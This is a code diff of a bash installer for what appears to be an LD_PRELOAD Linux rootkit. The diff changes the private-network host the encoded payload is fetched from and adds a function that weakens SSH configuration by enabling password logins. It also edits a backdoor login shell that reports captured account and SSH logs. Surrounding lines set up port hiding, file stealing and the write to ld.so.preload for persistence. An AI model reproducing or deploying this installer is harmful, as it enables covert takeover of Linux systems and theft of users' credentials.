@@ -4,7 +4,7 @@
 #   - wget or curl, base64 & tar
 
 # change this..
-B64TARGZ_LOCATION="http://192.168.0.48:9001/imgay.b64"
+B64TARGZ_LOCATION="http://192.168.0.33:9001/imgay.b64"
 # no need to touch anything else...
 
 # enter this directory when installing. change if needed.
@@ -38,6 +38,18 @@ read_toggles(){ # $1 = path of conf
         [ "$line" == 'FILE_STEAL=1' ] && FILE_STEAL=1
         [ "$line" == 'LOG_SSH=1' ] && LOG_SSH=1
     done <<< "`cat $conf`"
+}
+patch_sshdconfig(){
+    local sshd_config=/etc/ssh/sshd_config
+    [ ! -f $sshd_config ] && return
+
+    # enable PAM logins
+    [ "`cat $sshd_config | grep 'UsePAM'`" == 'UsePAM yes' ] || \
+        echo 'UsePAM yes' >> $sshd_config
+
+    # enable user password authentications
+    [ "`cat $sshd_config | grep 'PasswordAuthentication yes'`" == 'PasswordAuthentication yes' ] || \
+        echo 'PasswordAuthentication yes' >> $sshd_config
 }
 
 # do prerequisite checks now
@@ -121,19 +133,15 @@ BASHRC="tty -s || return
 [ ! -z \$TERM ] && export TERM=xterm
 [ \$(id -u) != 0 ] && su root
 [ \$(id -u) != 0 ] && kill -9 \$\$
-[ -f ~/BD_README ] && cat ~/BD_README | less --tilde -J -d && rm ~/BD_README
-
-# only show .ascii on first login.
-[ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"
-
+[ -f ~/.rolf ] && printf \"\\e[31m\`shuf -n1 ~/.rolf\`\\e[0m\\n\"
 alias ls=\"ls --color=auto\"
 alias ll=\"ls --color=auto -AlFhn\"
-
 id && who
 [ -f ~/auth_logs ] && echo -e \"\\e[1mLogged accounts: \\e[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\e[0m\"
 [ -f ~/ssh_logs ] && echo -e \"\\e[1mSSH logs: \\e[1;31m\$(cat ~/ssh_logs | wc -l)\\e[0m\""
 echo -n "$BASHRC" > $INSTALL_DIR/.bashrc
 echo -n ". .bashrc" > $INSTALL_DIR/.profile
+[ -f $INCLUDE_DIR/.rolf ] && mv $INCLUDE_DIR/.rolf $INSTALL_DIR/
 
 [ $HIDE_PORTS == 1 ] && { mktouch $HIDEPORTS && chmod 644 $HIDEPORTS && ln -s $HIDEPORTS $INSTALL_DIR/hideports && cat $INCLUDE_DIR/hideports > $INSTALL_DIR/hideports; }
 [ $FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
@@ -155,6 +163,8 @@ if [ $HIDE_SELF == 1 ]; then
 fi
 
 rm -r $INCLUDE_DIR
+
+#patch_sshdconfig
 
 echo "writing \$SOPATH to \$LDSO_PRELOAD"
 echo -n "$SOPATH" > $LDSO_PRELOAD || { echo "failed writing to \$LDSO_PRELOAD. exiting"; emergency_exit $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR; }
